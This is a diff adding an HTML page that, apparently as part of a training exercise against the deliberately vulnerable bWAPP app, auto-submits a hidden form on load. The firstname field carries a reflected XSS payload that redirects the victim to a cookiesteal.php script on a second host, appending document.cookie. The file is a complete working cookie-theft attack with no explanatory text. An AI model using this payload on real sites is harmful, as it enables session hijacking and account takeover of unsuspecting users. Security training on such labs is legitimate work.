@@ -1,0 +1,16 @@
+<html>
+
+<body onload="document.myForm.submit()">
+
+<form method="GET" action="http://192.168.139.3/bWAPP/xss_php_self.php" name="myForm">
+
+<input type=hidden name="firstname"  value="<script>document.location='http://192.168.139.4/synopsys/task2/cookiesteal.php?c='+document.cookie;</script>"/>
+<input type=hidden name="lastname"  value="hello hacker"/>
+<input type=hidden name="form"  value="submit"/>
+
+<!--
+<input type=submit name="form" id="submit" value="see magic here"/>
+-->
+</form>
+</body>
+</html>
